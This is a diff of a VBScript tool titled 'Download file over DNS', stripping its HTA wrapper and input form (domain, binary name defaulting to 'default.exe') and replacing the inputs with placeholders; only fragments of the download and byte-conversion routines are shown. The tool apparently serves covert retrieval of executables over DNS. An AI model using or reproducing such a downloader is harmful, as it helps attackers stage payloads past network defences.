@@ -1,11 +1,6 @@
-<html>
-<head>
-<HTA:APPLICATION ID="Download file over DNS">
-<script language="VBScript">
-
 Sub DownloadDNS
-	domainBased = domainText.value
-    filenameOutput = fileName.value
+	domainBased = <Domain>
+    filenameOutput = <output filename>
 	Dim endLoop
 	endLoop = False
 	chunks = ""
@@ -104,15 +99,3 @@ Function MultiByteToBinary(MultiByte)
     End If
     MultiByteToBinary = Binary
 End Function
-</script>
-</head>
-<body>
-Domain:
-<input type="text" name="domainText" size=100><br />
-Binary name:
-<input type="text" name="fileName" size=50 value="default.exe">
-<input type="Button" onClick="DownloadDNS()" value="Run" /><br />
-output:
-<div id="output_area"></div>
-</body>
-</html>
